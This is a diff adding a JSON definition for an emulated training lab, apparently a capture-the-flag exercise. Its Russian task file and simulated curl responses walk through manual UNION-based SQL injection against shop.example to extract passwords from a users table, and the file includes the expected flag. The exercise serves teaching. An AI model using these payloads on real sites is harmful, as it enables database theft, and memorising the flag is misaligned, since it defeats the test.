@@ -1,0 +1,24 @@
+{
+  "id": "web-tool-sqli-manual",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{m4nu4l_un10n_byp4ss3s_sqlm4p}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: ручная UNION-инъекция (без sqlmap)\n\nЦель — `https://shop.example/api/item?id=1`. Докажи инъекцию вручную и\nвытащи таблицу `users`.\n\n1. Нормальный ответ:\n\n   curl -s 'https://shop.example/api/item?id=1'\n\n2. Кавычка ломает запрос (ошибка СУБД):\n\n   curl -s 'https://shop.example/api/item?id=1%27'\n\n3. Определи число колонок через ORDER BY:\n\n   curl -s 'https://shop.example/api/item?id=1 ORDER BY 3'\n\n4. UNION-инъекция — вытащи пароль (флаг) из `users`:\n\n   curl -s 'https://shop.example/api/item?id=-1 UNION SELECT 1,password,3 FROM users-- -' > found.txt\n\n5. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.example/api/item)",
+      "cases": [
+        { "match": "UNION\\s*SELECT|union\\s*select", "example": "-s 'https://shop.example/api/item?id=-1 UNION SELECT 1,password,3 FROM users-- -'", "output": "{\"id\":1,\"name\":\"nto{m4nu4l_un10n_byp4ss3s_sqlm4p}\",\"price\":0.0}\n" },
+        { "match": "ORDER BY 3|order by 3", "example": "-s 'https://shop.example/api/item?id=1 ORDER BY 3'", "output": "{\"id\":1,\"name\":\"Laptop\",\"price\":999.0}\n" },
+        { "match": "ORDER BY 4|order by 4", "example": "-s 'https://shop.example/api/item?id=1 ORDER BY 4'", "output": "{\"error\":\"SQL error: 1st ORDER BY term out of range\"}\n" },
+        { "match": "%27", "example": "-s 'https://shop.example/api/item?id=1%27'", "output": "{\"error\":\"SQL syntax error near \\\"'\\\" at line 1\"}\n" },
+        { "match": "1=2", "example": "-s 'https://shop.example/api/item?id=1 AND 1=2'", "output": "{\"error\":\"not found\"}\n" },
+        { "match": "id=1", "example": "-s 'https://shop.example/api/item?id=1'", "output": "{\"id\":1,\"name\":\"Laptop\",\"price\":999.0}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только https://shop.example/api/item?id=...\n"
+    }
+  }
+}
